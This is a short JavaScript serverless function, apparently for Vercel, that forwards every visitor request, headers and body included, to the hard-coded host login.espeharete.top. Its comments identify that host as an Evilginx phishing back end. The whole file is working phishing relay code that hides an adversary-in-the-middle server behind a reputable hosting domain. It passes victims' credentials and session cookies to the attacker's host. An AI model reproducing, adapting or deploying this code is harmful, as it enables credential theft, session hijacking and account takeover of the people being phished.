export default async function handler(req, res) {
  const targetUrl = `https://login.espeharete.top${req.url}`;

  // Clone headers (critical for Evilginx to work)
  const headers = { ...req.headers };
  delete headers['host']; // Remove Vercel's host header

  try {
    const response = await fetch(targetUrl, {
      method: req.method,
      headers: headers,
      body: req.method !== 'GET' ? req.body : undefined,
    });

    // Forward headers from Evilginx to the client
    for (const [key, value] of response.headers) {
      res.setHeader(key, value);
    }

    // Stream the raw response (don't decode)
    const buffer = await response.arrayBuffer();
    res.status(response.status).send(Buffer.from(buffer));
  } catch (error) {
    res.status(500).send("Proxy error: " + error.message);
  }
}
